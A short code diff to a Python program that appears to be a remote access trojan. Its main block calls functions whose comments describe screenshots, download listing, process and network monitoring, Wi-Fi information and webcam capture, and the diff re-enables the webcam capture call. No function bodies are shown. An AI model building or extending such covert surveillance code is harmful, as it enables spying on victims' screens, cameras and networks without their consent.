@@ -4,9 +4,9 @@ import os
 import requests
 import pyautogui
 import keyboard
-import psutil  # For system monitoring
-import cv2  # For webcam capture
-import pyaudio  # For audio recording
+import psutil 
+import cv2  
+import pyaudio 
 import wave
 import sqlite3
 import paramiko
@@ -280,7 +280,7 @@ if __name__ == "__main__":
     system_monitor()  # Monitor system activity
     rat2()  # List Downloads
     rat3()  # Take screenshot
-    #rat5()  # Capture webcam image
+    rat5()  # Capture webcam image
     rat6()  # Get active processes
     rat7()  # Monitor network traffic
     rat13()  # Get Wi-Fi information
